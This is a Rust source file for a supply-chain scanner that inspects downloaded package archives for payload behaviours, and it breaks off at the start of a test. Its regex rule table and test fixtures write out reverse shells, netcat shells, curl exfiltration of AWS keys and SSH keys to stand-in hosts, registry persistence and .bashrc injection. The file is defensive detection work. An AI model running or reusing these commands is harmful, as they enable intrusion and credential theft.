//! Phase B — looking at the artifact itself.
//!
//! Advisory data can only describe vulnerabilities somebody has already filed.
//! A typosquat published an hour ago, or a release backdoored between tags, has
//! no record anywhere; the only thing that has seen it is the archive on disk.
//! This module reads that archive before the binary is linked, and looks for
//! the handful of behaviours that distinguish a package from a payload.
//!
//! It is not an antivirus and does not pretend to be. It is a small, documented
//! set of high-signal rules, and its calibration matters as much as its
//! coverage: a scanner that blocks ordinary release archives gets turned off,
//! and then it protects nothing. So the rules are split by confidence —
//! [`ScanSeverity::Block`] for patterns with no benign reading, and
//! [`ScanSeverity::Warn`] for the ones that are suspicious in context but
//! common in honest install scripts.

use std::collections::HashMap;
use std::fs;
use std::path::{Path, PathBuf};

use regex::RegexSet;
use serde_json::{json, Value};

use crate::utils::fs::truncate_str;

/// Per-file read ceiling. Anything larger is scanned only up to this much: the
/// interesting strings in a dropper are at the top of the file, and reading a
/// 400MB binary in full would cost more than the check is worth.
const MAX_FILE_BYTES: usize = 8 * 1024 * 1024;

/// Total bytes the scanner will read across a whole tree.
const MAX_TOTAL_BYTES: u64 = 256 * 1024 * 1024;

/// Total files the scanner will open in a whole tree.
const MAX_FILES: usize = 20_000;

/// How deep into an extracted tree the walk goes before giving up.
const MAX_DEPTH: usize = 24;

/// Minimum run length for a printable string pulled out of a binary.
const MIN_STRING_RUN: usize = 6;

/// Entropy is only meaningful for a script small enough to be a wrapper around
/// a blob; a large data file reads as random for entirely innocent reasons.
const ENTROPY_MIN_BYTES: u64 = 64;
const ENTROPY_MAX_BYTES: u64 = 8 * 1024;

/// Bits per byte above which a *script* is treated as obfuscated. Plain source
/// sits near 4.5–5.0; a base64 or packed blob sits above 5.8.
const ENTROPY_THRESHOLD: f64 = 5.8;

/// How much of a matching line is quoted back as evidence.
const EVIDENCE_CHARS: usize = 120;

/// What a finding means for the install.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ScanSeverity {
    /// Reported, install continues
    Warn,
    /// The install is aborted and the download is purged
    Block,
}

impl ScanSeverity {
    pub fn label(self) -> &'static str {
        match self {
            ScanSeverity::Warn => "warn",
            ScanSeverity::Block => "block",
        }
    }
}

/// The rule a finding came from.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ScanRule {
    /// Code that fetches or decodes something and then runs it
    SuspiciousPayload,
    /// Credentials or secrets read and sent somewhere
    ExfilAttempt,
    /// A runnable or startup file an archive has no reason to ship
    UnexpectedExecutable,
    /// A small script whose contents read as packed data
    HighEntropy,
    /// setuid/setgid or world-writable bits inside the archive.
    ///
    /// Only ever constructed on Unix — Windows has no such bits — but the
    /// variant exists on both so the rule table, the JSON shape and the
    /// `referee` output are identical across platforms.
    #[cfg_attr(not(unix), allow(dead_code))]
    UnsafePermissions,
    /// A third-party engine recognised the file's hash
    VirusTotalDetection,
}

impl ScanRule {
    pub fn label(self) -> &'static str {
        match self {
            ScanRule::SuspiciousPayload => "suspicious-payload",
            ScanRule::ExfilAttempt => "exfil-attempt",
            ScanRule::UnexpectedExecutable => "unexpected-executable",
            ScanRule::HighEntropy => "high-entropy",
            ScanRule::UnsafePermissions => "unsafe-permissions",
            ScanRule::VirusTotalDetection => "virustotal-detection",
        }
    }
}

/// One thing the scanner found, and where.
#[derive(Debug, Clone)]
pub struct ScanFinding {
    pub path: PathBuf,
    pub rule: ScanRule,
    pub severity: ScanSeverity,
    /// The matching snippet or computed value, truncated for display
    pub evidence: String,
}

impl ScanFinding {
    pub fn describe(&self) -> String {
        format!(
            "{} [{}] {} — {}",
            self.severity.label(),
            self.rule.label(),
            self.path.display(),
            self.evidence
        )
    }

    pub fn to_json(&self) -> Value {
        json!({
            "path": self.path.to_string_lossy(),
            "rule": self.rule.label(),
            "severity": self.severity.label(),
            "evidence": self.evidence,
        })
    }
}

/// One text pattern and what a match means.
struct Pattern {
    regex: &'static str,
    rule: ScanRule,
    severity: ScanSeverity,
}

/// The rule table.
///
/// Every pattern is matched case-insensitively against file text (and against
/// printable strings recovered from binaries). Proximity is expressed with
/// bounded `[\s\S]{0,N}` gaps rather than unbounded ones, so a match means the
/// two halves of a behaviour appear together, not merely somewhere in the same
/// file.
const PATTERNS: &[Pattern] = &[
    // --- Decode-then-execute: no benign reading. ---
    Pattern {
        regex: r"base64\s+(?:-d|-D|--decode)[^\n|]{0,120}\|\s*(?:ba|z|da|k)?sh\b",
        rule: ScanRule::SuspiciousPayload,
        severity: ScanSeverity::Block,
    },
    Pattern {
        regex: r"echo\s+[A-Za-z0-9+/=]{40,}[^\n]{0,40}\|\s*base64",
        rule: ScanRule::SuspiciousPayload,
        severity: ScanSeverity::Block,
    },
    Pattern {
        regex: r"\[convert\]::frombase64string[\s\S]{0,300}?(?:iex\b|invoke-expression)",
        rule: ScanRule::SuspiciousPayload,
        severity: ScanSeverity::Block,
    },
    Pattern {
        regex: r"(?:iex\b|invoke-expression)[\s\S]{0,300}?\[convert\]::frombase64string",
        rule: ScanRule::SuspiciousPayload,
        severity: ScanSeverity::Block,
    },
    Pattern {
        regex: r"certutil(?:\.exe)?\s[^\n]{0,160}-urlcache",
        rule: ScanRule::SuspiciousPayload,
        severity: ScanSeverity::Block,
    },
    Pattern {
        regex: r"(?:iex\b|invoke-expression)\s*\(\s*(?:new-object\s+)?(?:net\.webclient|system\.net\.webclient)",
        rule: ScanRule::SuspiciousPayload,
        severity: ScanSeverity::Block,
    },
    Pattern {
        regex: r"downloadstring\s*\([^\n]{0,200}\)\s*\|\s*(?:iex\b|invoke-expression)",
        rule: ScanRule::SuspiciousPayload,
        severity: ScanSeverity::Block,
    },
    // --- Reverse shells. ---
    Pattern {
        regex: r"/dev/tcp/[0-9a-z.\-]+/[0-9]+",
        rule: ScanRule::SuspiciousPayload,
        severity: ScanSeverity::Block,
    },
    Pattern {
        regex: r"\bnc(?:\.exe)?\s+(?:-[a-z]*e[a-z]*)\s+/bin/(?:ba|z|da)?sh",
        rule: ScanRule::SuspiciousPayload,
        severity: ScanSeverity::Block,
    },
    // --- Persistence. ---
    Pattern {
        regex: r"reg(?:\.exe)?\s+add\s[^\n]{0,200}currentversion\\+run",
        rule: ScanRule::SuspiciousPayload,
        severity: ScanSeverity::Block,
    },
    Pattern {
        regex: r"schtasks(?:\.exe)?\s+/create\b",
        rule: ScanRule::SuspiciousPayload,
        severity: ScanSeverity::Warn,
    },
    Pattern {
        regex: r"new-scheduledtask(?:action|trigger)?\b",
        rule: ScanRule::SuspiciousPayload,
        severity: ScanSeverity::Warn,
    },
    Pattern {
        regex: r"(?:crontab\s+-|/etc/cron\.d/|systemctl\s+enable)",
        rule: ScanRule::SuspiciousPayload,
        severity: ScanSeverity::Warn,
    },
    // --- Write to a temp directory, then run what was written. ---
    Pattern {
        regex: r"chmod\s+(?:\+x|[0-7]*7[0-7]*)\s+(?:\$\{?tmpdir\}?|/tmp|/var/tmp|/dev/shm)/",
        rule: ScanRule::SuspiciousPayload,
        severity: ScanSeverity::Block,
    },
    Pattern {
        regex: r"(?:%temp%|\$env:temp)\\+[^\n]{0,80}[\s\S]{0,200}?start-process",
        rule: ScanRule::SuspiciousPayload,
        severity: ScanSeverity::Block,
    },
    // --- Download-and-run. Common in honest install scripts, so it warns. ---
    Pattern {
        regex: r"\b(?:curl|wget)\b[^\n|]{0,200}\|\s*(?:sudo\s+)?(?:ba|z|da|k)?sh\b",
        rule: ScanRule::SuspiciousPayload,
        severity: ScanSeverity::Warn,
    },
    Pattern {
        regex: r"\b(?:invoke-webrequest|iwr|wget|curl)\b[^\n|]{0,200}\|\s*(?:iex\b|invoke-expression)",
        rule: ScanRule::SuspiciousPayload,
        severity: ScanSeverity::Warn,
    },
    Pattern {
        regex: r"powershell(?:\.exe)?\s[^\n]{0,120}-(?:enc|encodedcommand)\b",
        rule: ScanRule::SuspiciousPayload,
        severity: ScanSeverity::Block,
    },
    Pattern {
        regex: r"-(?:executionpolicy|ep)\s+bypass\b[^\n]{0,120}-(?:w|windowstyle)\s+hidden",
        rule: ScanRule::SuspiciousPayload,
        severity: ScanSeverity::Block,
    },
    // --- Reading a secret and sending it somewhere. ---
    Pattern {
        regex: r"(?:aws_secret_access_key|aws_access_key_id|aws_session_token|azure_client_secret|github_token|gh_token|npm_token|pgpassword|openai_api_key|docker_password|ssh_auth_sock)[\s\S]{0,240}?(?:curl\b|wget\b|invoke-webrequest|iwr\b|nc\b|/dev/tcp/|webclient)",
        rule: ScanRule::ExfilAttempt,
        severity: ScanSeverity::Block,
    },
    Pattern {
        regex: r"(?:curl\b|wget\b|invoke-webrequest|iwr\b|nc\b|/dev/tcp/|webclient)[\s\S]{0,240}?(?:aws_secret_access_key|aws_access_key_id|aws_session_token|azure_client_secret|github_token|npm_token|pgpassword|openai_api_key)",
        rule: ScanRule::ExfilAttempt,
        severity: ScanSeverity::Block,
    },
    Pattern {
        regex: r"(?:~/\.ssh/id_[a-z0-9]+|\.aws/credentials|\.config/gcloud/credentials|\.npmrc|\.docker/config\.json)[\s\S]{0,240}?(?:curl\b|wget\b|invoke-webrequest|iwr\b|/dev/tcp/|webclient)",
        rule: ScanRule::ExfilAttempt,
        severity: ScanSeverity::Block,
    },
    // --- Writing into the user's shell startup. ---
    Pattern {
        regex: r">>\s*(?:\$home|~|\$\{?home\}?)/\.(?:bashrc|zshrc|profile|bash_profile)",
        rule: ScanRule::SuspiciousPayload,
        severity: ScanSeverity::Block,
    },
];

/// File extensions treated as scripts: read as text, and eligible for the
/// entropy rule.
const SCRIPT_EXTENSIONS: &[&str] = &[
    "sh", "bash", "zsh", "ksh", "py", "pl", "rb", "lua", "ps1", "psm1", "bat", "cmd", "vbs", "js",
    "mjs", "cjs", "php", "tcl", "awk", "fish", "nu", "r",
];

/// Extensions and filenames that make a file runnable or auto-running on
/// Windows, and which a *release archive* has no business shipping.
const UNEXPECTED_EXTENSIONS: &[&str] = &[
    "lnk",
    "url",
    "scr",
    "pif",
    "hta",
    "jse",
    "wsf",
    "wsh",
    "msi",
    "msp",
    "reg",
    "desktop",
    "cpl",
    "appref-ms",
];

/// Filenames that run themselves regardless of extension.
const AUTORUN_NAMES: &[&str] = &[
    "autorun.inf",
    "desktop.ini",
    ".bash_profile",
    ".bashrc",
    ".zshrc",
    ".profile",
];

/// Phase B's rule engine over an extracted tree.
pub struct ArtifactScanner {
    patterns: RegexSet,
    rules: Vec<(ScanRule, ScanSeverity)>,
}

impl Default for ArtifactScanner {
    fn default() -> Self {
        Self::new()
    }
}

impl ArtifactScanner {
    pub fn new() -> Self {
        let expressions: Vec<String> = PATTERNS
            .iter()
            .map(|pattern| format!("(?i){}", pattern.regex))
            .collect();

        // Every pattern in the table is a literal in this file, so a failure
        // here is a programming error, not a runtime condition. Falling back to
        // an empty set keeps a typo from taking the whole command down with it,
        // and says so loudly.
        let patterns = RegexSet::new(&expressions).unwrap_or_else(|e| {
            tracing::debug!("referee: scan patterns failed to compile: {}", e);
            RegexSet::empty()
        });

        Self {
            patterns,
            rules: PATTERNS
                .iter()
                .map(|pattern| (pattern.rule, pattern.severity))
                .collect(),
        }
    }

    /// Scan an extracted package tree, worst findings first.
    ///
    /// Reading is bounded in every direction — per file, per tree, by file
    /// count and by depth — so a hostile archive cannot turn the scan itself
    /// into the denial of service.
    pub fn scan_tree(&self, root: &Path) -> Vec<ScanFinding> {
        let mut findings = Vec::new();
        let mut budget = Budget::default();

        self.walk(root, root, 0, &mut findings, &mut budget);

        if budget.exhausted {
            tracing::debug!(
                "referee: scan of {} stopped at its read budget ({} files, {} bytes)",
                root.display(),
                budget.files,
                budget.bytes
            );
        }

        findings.sort_by_key(|finding| match finding.severity {
            ScanSeverity::Block => 0,
            ScanSeverity::Warn => 1,
        });
        findings
    }

    fn walk(
        &self,
        root: &Path,
        dir: &Path,
        depth: usize,
        findings: &mut Vec<ScanFinding>,
        budget: &mut Budget,
    ) {
        if depth > MAX_DEPTH || budget.exhausted {
            return;
        }

        let entries = match fs::read_dir(dir) {
            Ok(entries) => entries,
            Err(e) => {
                tracing::debug!("referee: cannot read {}: {}", dir.display(), e);
                return;
            }
        };

        for entry in entries.flatten() {
            if budget.exhausted {
                return;
            }

            let path = entry.path();
            // A symlink is followed by nothing here: its target is either
            // inside the tree (already visited) or outside it (not this
            // package's content), and following one is how a walk escapes the
            // directory it was pointed at.
            let metadata = match fs::symlink_metadata(&path) {
                Ok(metadata) => metadata,
                Err(_) => continue,
            };

            if metadata.is_symlink() {
                continue;
            }

            if metadata.is_dir() {
                self.walk(root, &path, depth + 1, findings, budget);
                continue;
            }

            if !metadata.is_file() {
                continue;
            }

            budget.files += 1;
            if budget.files > MAX_FILES || budget.bytes > MAX_TOTAL_BYTES {
                budget.exhausted = true;
                return;
            }

            self.scan_file(root, &path, metadata.len(), findings, budget);

            #[cfg(unix)]
            self.check_permissions(root, &path, &metadata, findings);
        }
    }

    fn scan_file(
        &self,
        root: &Path,
        path: &Path,
        size: u64,
        findings: &mut Vec<ScanFinding>,
        budget: &mut Budget,
    ) {
        let relative = relative_to(root, path);

        if let Some(evidence) = unexpected_runnable(path) {
            findings.push(ScanFinding {
                path: relative.clone(),
                rule: ScanRule::UnexpectedExecutable,
                severity: ScanSeverity::Warn,
                evidence,
            });
        }

        let bytes = match read_capped(path, MAX_FILE_BYTES) {
            Ok(bytes) => bytes,
            Err(e) => {
                tracing::debug!("referee: cannot read {}: {}", path.display(), e);
                return;
            }
        };
        budget.bytes += bytes.len() as u64;

        if bytes.is_empty() {
            return;
        }

        let is_script = has_script_extension(path);
        let text = if looks_binary(&bytes) {
            printable_strings(&bytes)
        } else {
            String::from_utf8_lossy(&bytes).into_owned()
        };

        for finding in self.match_patterns(&text) {
            findings.push(ScanFinding {
                path: relative.clone(),
                rule: finding.0,
                severity: finding.1,
                evidence: finding.2,
            });
        }

        if is_script && (ENTROPY_MIN_BYTES..=ENTROPY_MAX_BYTES).contains(&size) {
            let entropy = shannon_entropy(&bytes);
            if entropy > ENTROPY_THRESHOLD {
                findings.push(ScanFinding {
                    path: relative,
                    rule: ScanRule::HighEntropy,
                    severity: ScanSeverity::Warn,
                    evidence: format!("{:.2} bits/byte over {} bytes", entropy, size),
                });
            }
        }
    }

    /// Run the pattern set over one file's text, at most one finding per rule.
    ///
    /// Deduplicating by rule keeps a minified script that trips the same
    /// pattern two hundred times from burying every other finding.
    fn match_patterns(&self, text: &str) -> Vec<(ScanRule, ScanSeverity, String)> {
        let mut seen: HashMap<&'static str, (ScanRule, ScanSeverity, String)> = HashMap::new();

        for index in self.patterns.matches(text).into_iter() {
            let (rule, severity) = match self.rules.get(index) {
                Some(entry) => *entry,
                None => continue,
            };

            let evidence = evidence_for(text, PATTERNS[index].regex);
            seen.entry(rule.label())
                .and_modify(|existing| {
                    // A blocking hit outranks a warning one for the same rule.
                    if severity == ScanSeverity::Block && existing.1 == ScanSeverity::Warn {
                        *existing = (rule, severity, evidence.clone());
                    }
                })
                .or_insert((rule, severity, evidence));
        }

        let mut out: Vec<_> = seen.into_values().collect();
        out.sort_by_key(|finding| finding.0.label());
        out
    }

    /// Unix permission bits that an extracted archive should never carry.
    ///
    /// setuid/setgid inside a downloaded archive is a privilege-escalation
    /// primitive with no legitimate use in a linked release artifact, so it
    /// blocks. World-writable is sloppy rather than hostile, so it warns.
    #[cfg(unix)]
    fn check_permissions(
        &self,
        root: &Path,
        path: &Path,
        metadata: &fs::Metadata,
        findings: &mut Vec<ScanFinding>,
    ) {
        use std::os::unix::fs::PermissionsExt;

        let mode = metadata.permissions().mode();

        if mode & 0o6000 != 0 {
            findings.push(ScanFinding {
                path: relative_to(root, path),
                rule: ScanRule::UnsafePermissions,
                severity: ScanSeverity::Block,
                evidence: format!("mode {:04o} sets the setuid/setgid bit", mode & 0o7777),
            });
        } else if mode & 0o002 != 0 {
            findings.push(ScanFinding {
                path: relative_to(root, path),
                rule: ScanRule::UnsafePermissions,
                severity: ScanSeverity::Warn,
                evidence: format!("mode {:04o} is world-writable", mode & 0o7777),
            });
        }
    }
}

/// How much the scanner has read so far.
#[derive(Default)]
struct Budget {
    files: usize,
    bytes: u64,
    exhausted: bool,
}

/// Every file in an extracted tree that would run if it were launched.
///
/// Uses the same definition of "executable" as `find_binary_in_dir` — the exec
/// bit on Unix, the extension on Windows — so the scanner, the binary finder
/// and any hash lookup all agree on what counts as a program.
pub fn executable_candidates(root: &Path) -> Vec<PathBuf> {
    let mut out = Vec::new();
    collect_executables(root, 0, &mut out);
    out.sort();
    out
}

fn collect_executables(dir: &Path, depth: usize, out: &mut Vec<PathBuf>) {
    if depth > MAX_DEPTH || out.len() >= MAX_FILES {
        return;
    }

    let entries = match fs::read_dir(dir) {
        Ok(entries) => entries,
        Err(_) => return,
    };

    for entry in entries.flatten() {
        let path = entry.path();
        let metadata = match fs::symlink_metadata(&path) {
            Ok(metadata) => metadata,
            Err(_) => continue,
        };

        if metadata.is_symlink() {
            continue;
        }
        if metadata.is_dir() {
            collect_executables(&path, depth + 1, out);
            continue;
        }
        if metadata.is_file() && is_runnable(&path, &metadata) {
            out.push(path);
        }
    }
}

#[cfg(unix)]
fn is_runnable(_path: &Path, metadata: &fs::Metadata) -> bool {
    use std::os::unix::fs::PermissionsExt;
    metadata.permissions().mode() & 0o111 != 0
}

#[cfg(not(unix))]
fn is_runnable(path: &Path, _metadata: &fs::Metadata) -> bool {
    has_windows_executable_extension(path)
}

/// Whether a filename is one Windows will run.
///
/// The same set `find_binary_in_dir` uses, kept out of the `cfg` branch so it
/// can be tested from any host — the rule it encodes is about filenames, not
/// about the machine reading them.
#[cfg_attr(unix, allow(dead_code))]
fn has_windows_executable_extension(path: &Path) -> bool {
    let name = path
        .file_name()
        .and_then(|name| name.to_str())
        .unwrap_or("")
        .to_ascii_lowercase();
    name.ends_with(".exe") || name.ends_with(".bat") || name.ends_with(".cmd")
}

/// Whether any finding is serious enough to abort the install.
pub fn has_blocking(findings: &[ScanFinding]) -> bool {
    findings
        .iter()
        .any(|finding| finding.severity == ScanSeverity::Block)
}

/// The path as the user recognises it: relative to the extract directory.
fn relative_to(root: &Path, path: &Path) -> PathBuf {
    path.strip_prefix(root).unwrap_or(path).to_path_buf()
}

/// Read at most `limit` bytes of a file.
fn read_capped(path: &Path, limit: usize) -> std::io::Result<Vec<u8>> {
    use std::io::Read;

    let file = fs::File::open(path)?;
    let mut buffer = Vec::new();
    file.take(limit as u64).read_to_end(&mut buffer)?;
    Ok(buffer)
}

/// The same NUL-byte test every text/binary heuristic uses, over the head of
/// the file.
fn looks_binary(bytes: &[u8]) -> bool {
    bytes.iter().take(8192).any(|byte| *byte == 0)
}

fn has_script_extension(path: &Path) -> bool {
    path.extension()
        .and_then(|extension| extension.to_str())
        .map(|extension| {
            let extension = extension.to_ascii_lowercase();
            SCRIPT_EXTENSIONS.contains(&extension.as_str())
        })
        .unwrap_or(false)
}

/// Why this file is an unexpected runnable, if it is one.
fn unexpected_runnable(path: &Path) -> Option<String> {
    let name = path.file_name()?.to_str()?.to_ascii_lowercase();

    if AUTORUN_NAMES.contains(&name.as_str()) {
        return Some(format!("'{}' runs on its own at login or on mount", name));
    }

    let extension = path
        .extension()
        .and_then(|extension| extension.to_str())?
        .to_ascii_lowercase();

    if UNEXPECTED_EXTENSIONS.contains(&extension.as_str()) {
        return Some(format!(
            "'.{}' is a launcher or installer, not a program a package links",
            extension
        ));
    }

    None
}

/// Pull printable ASCII runs out of a binary, the way `strings` does.
fn printable_strings(bytes: &[u8]) -> String {
    let mut out = String::with_capacity(bytes.len() / 4);
    let mut run = String::new();

    for byte in bytes {
        if byte.is_ascii_graphic() || *byte == b' ' || *byte == b'\t' {
            run.push(*byte as char);
        } else {
            if run.len() >= MIN_STRING_RUN {
                out.push_str(&run);
                out.push('\n');
            }
            run.clear();
        }
    }

    if run.len() >= MIN_STRING_RUN {
        out.push_str(&run);
        out.push('\n');
    }

    out
}

/// Shannon entropy of a byte slice, in bits per byte.
pub fn shannon_entropy(bytes: &[u8]) -> f64 {
    if bytes.is_empty() {
        return 0.0;
    }

    let mut counts = [0u64; 256];
    for byte in bytes {
        counts[*byte as usize] += 1;
    }

    let total = bytes.len() as f64;
    counts
        .iter()
        .filter(|count| **count > 0)
        .map(|count| {
            let p = *count as f64 / total;
            -p * p.log2()
        })
        .sum()
}

/// Quote the text that tripped a pattern.
///
/// Recompiling the single pattern is cheap next to reading the file, and it is
/// what turns "this file matched rule 7" into something a user can judge.
fn evidence_for(text: &str, regex: &str) -> String {
    match regex::Regex::new(&format!("(?i){}", regex)) {
        Ok(compiled) => match compiled.find(text) {
            Some(found) => truncate_str(found.as_str().trim(), EVIDENCE_CHARS),
            None => "<pattern matched>".to_string(),
        },
        Err(_) => "<pattern matched>".to_string(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::sync::atomic::{AtomicU64, Ordering};

    fn scratch(label: &str) -> PathBuf {
        static COUNTER: AtomicU64 = AtomicU64::new(0);
        let n = COUNTER.fetch_add(1, Ordering::SeqCst);
        let dir = std::env::temp_dir().join(format!(
            "baller_scan_{}_{}_{}_{}",
            label,
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos(),
            n
        ));
        fs::create_dir_all(&dir).unwrap();
        dir
    }

    fn write(dir: &Path, name: &str, contents: &str) -> PathBuf {
        let path = dir.join(name);
        if let Some(parent) = path.parent() {
            fs::create_dir_all(parent).unwrap();
        }
        fs::write(&path, contents).unwrap();
        path
    }

    fn scan(dir: &Path) -> Vec<ScanFinding> {
        ArtifactScanner::new().scan_tree(dir)
    }

    fn rules(findings: &[ScanFinding]) -> Vec<&'static str> {
        let mut out: Vec<&'static str> = findings.iter().map(|f| f.rule.label()).collect();
        out.sort_unstable();
        out.dedup();
        out
    }

    #[test]
    fn test_benign_tree_produces_no_findings() {
        let dir = scratch("benign");
        write(&dir, "README.md", "# tool\n\nA perfectly ordinary tool.\n");
        write(
            &dir,
            "run.sh",
            "#!/bin/sh\nset -eu\nexec \"$(dirname \"$0\")/tool\" \"$@\"\n",
        );
        fs::write(dir.join("tool"), vec![0u8, 1, 2, 3, b'E', b'L', b'F']).unwrap();

        assert!(scan(&dir).is_empty());
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn test_base64_piped_into_a_shell_blocks() {
        let dir = scratch("b64");
        write(
            &dir,
            "install.sh",
            "#!/bin/sh\necho aGVsbG8gd29ybGQgdGhpcyBpcyBhIHBheWxvYWQgZm9yIHRlc3Rpbmc= | base64 -d | sh\n",
        );
        let findings = scan(&dir);
        assert!(has_blocking(&findings));
        assert!(rules(&findings).contains(&"suspicious-payload"));
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn test_powershell_frombase64string_with_iex_blocks() {
        let dir = scratch("ps");
        write(
            &dir,
            "setup.ps1",
            "$b = [Convert]::FromBase64String($blob)\niex ([Text.Encoding]::UTF8.GetString($b))\n",
        );
        let findings = scan(&dir);
        assert!(has_blocking(&findings));
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn test_certutil_urlcache_blocks() {
        let dir = scratch("certutil");
        write(
            &dir,
            "go.cmd",
            "certutil.exe -urlcache -split -f http://example.test/p.b64 p.b64\r\n",
        );
        assert!(has_blocking(&scan(&dir)));
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn test_reverse_shell_blocks() {
        let dir = scratch("revshell");
        write(&dir, "post.sh", "bash -i >& /dev/tcp/10.0.0.9/4444 0>&1\n");
        assert!(has_blocking(&scan(&dir)));
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn test_registry_run_persistence_blocks() {
        let dir = scratch("regrun");
        write(
            &dir,
            "install.bat",
            "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v tool /d payload.exe /f\r\n",
        );
        assert!(has_blocking(&scan(&dir)));
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn test_curl_pipe_sh_warns_rather_than_blocking() {
        let dir = scratch("curlsh");
        write(
            &dir,
            "bootstrap.sh",
            "#!/bin/sh\ncurl -fsSL https://example.test/install | sh\n",
        );
        let findings = scan(&dir);
        assert!(!findings.is_empty());
        assert!(!has_blocking(&findings));
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn test_exfil_of_aws_credentials_blocks() {
        let dir = scratch("exfil");
        write(
            &dir,
            "hook.sh",
            "#!/bin/sh\ncurl -X POST -d \"$AWS_SECRET_ACCESS_KEY\" https://drop.example.test/\n",
        );
        let findings = scan(&dir);
        assert!(has_blocking(&findings));
        assert!(rules(&findings).contains(&"exfil-attempt"));
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn test_ssh_key_exfil_blocks() {
        let dir = scratch("sshexfil");
        write(
            &dir,
            "post.py",
            "data = open('~/.ssh/id_rsa').read()\nos.system('curl -d @- https://drop.example.test')\n",
        );
        assert!(has_blocking(&scan(&dir)));
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn test_shell_rc_injection_blocks() {
        let dir = scratch("rc");
        write(
            &dir,
            "install.sh",
            "#!/bin/sh\necho 'curl evil | sh' >> $HOME/.bashrc\n",
        );
        assert!(has_blocking(&scan(&dir)));
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn test_temp_write_then_chmod_blocks() {
        let dir = scratch("tmpexec");
        write(
            &dir,
            "stage.sh",
            "#!/bin/sh\ncp ./blob /tmp/.x\nchmod +x /tmp/.x\n/tmp/.x\n",
        );
        assert!(has_blocking(&scan(&dir)));
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn test_unexpected_launcher_file_warns() {
        let dir = scratch("lnk");
        write(&dir, "Start Tool.lnk", "binary-ish");
        write(&dir, "autorun.inf", "[autorun]\nopen=setup.exe\n");
        let findings = scan(&dir);
        assert!(!has_blocking(&findings));
        assert!(rules(&findings).contains(&"unexpected-executable"));
        assert_eq!(
            findings
                .iter()
                .filter(|f| f.rule == ScanRule::UnexpectedExecutable)
                .count(),
            2
        );
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn test_desktop_entry_warns() {
        let dir = scratch("desktop");
        write(
            &dir,
            "tool.desktop",
            "[Desktop Entry]\nExec=/usr/bin/tool\n",
        );
        assert!(rules(&scan(&dir)).contains(&"unexpected-executable"));
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn test_high_entropy_mini_script_warns() {
        let dir = scratch("entropy");
        // 2 KB of base64-looking noise in a .sh file.
        let alphabet: Vec<u8> =
            b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".to_vec();
        let mut blob = String::new();
        let mut state: u64 = 0x2545F4914F6CDD1D;
        for _ in 0..2048 {
            state ^= state << 13;
            state ^= state >> 7;
            state ^= state << 17;
            blob.push(alphabet[(state % alphabet.len() as u64) as usize] as char);
        }
        write(&dir, "payload.sh", &blob);

        let findings = scan(&dir);
        assert!(rules(&findings).contains(&"high-entropy"));
        assert!(!has_blocking(&findings));
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn test_plain_script_is_not_flagged_as_high_entropy() {
        let dir = scratch("plainscript");
        let mut script = String::from("#!/bin/sh\n");
        for i in 0..80 {
            script.push_str(&format!("echo \"step {} of the build\"\n", i));
        }
        write(&dir, "build.sh", &script);
        assert!(!rules(&scan(&dir)).contains(&"high-entropy"));
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn test_binary_strings_are_scanned_too() {
        let dir = scratch("binstrings");
        let mut bytes = vec![0x7f, b'E', b'L', b'F', 0x00, 0x00];
        bytes.extend_from_slice(b"harmless padding\x00");
        bytes.extend_from_slice(b"/dev/tcp/10.1.2.3/9001\x00");
        fs::write(dir.join("tool"), bytes).unwrap();
        assert!(has_blocking(&scan(&dir)));
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn test_nested_directories_are_scanned() {
        let dir = scratch("nested");
        write(
            &dir,
            "a/b/c/hook.sh",
            "#!/bin/sh\nbash -i >& /dev/tcp/1.2.3.4/1234 0>&1\n",
        );
        let findings = scan(&dir);
        assert!(has_blocking(&findings));
        assert_eq!(
            findings[0].path,
            PathBuf::from("a").join("b").join("c").join("hook.sh")
        );
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn test_findings_report_paths_relative_to_the_extract_dir() {
        let dir = scratch("relpath");
        write(&dir, "bin/go.sh", "#!/bin/sh\ncurl x | sh\n");
        let findings = scan(&dir);
        assert_eq!(findings[0].path, PathBuf::from("bin").join("go.sh"));
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn test_one_finding_per_rule_per_file() {
        let dir = scratch("dedupe");
        let mut script = String::from("#!/bin/sh\n");
        for _ in 0..50 {
            script.push_str("curl https://example.test/x | sh\n");
        }
        write(&dir, "many.sh", &script);
        let findings = scan(&dir);
        assert_eq!(findings.len(), 1);
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn test_blocking_findings_sort_first() {
        let dir = scratch("sortorder");
        write(&dir, "warn.sh", "#!/bin/sh\ncurl https://x.test | sh\n");
        write(&dir, "block.sh", "#!/bin/sh\nnc -e /bin/sh 10.0.0.1 9\n");
        let findings = scan(&dir);
        assert!(findings.len() >= 2);
        assert_eq!(findings[0].severity, ScanSeverity::Block);
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn test_evidence_quotes_the_match() {
        let dir = scratch("evidence");
        write(
            &dir,
            "go.sh",
            "#!/bin/sh\nbash -i >& /dev/tcp/198.51.100.7/4444 0>&1\n",
        );
        let findings = scan(&dir);
        assert!(findings[0].evidence.contains("/dev/tcp/198.51.100.7/4444"));
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
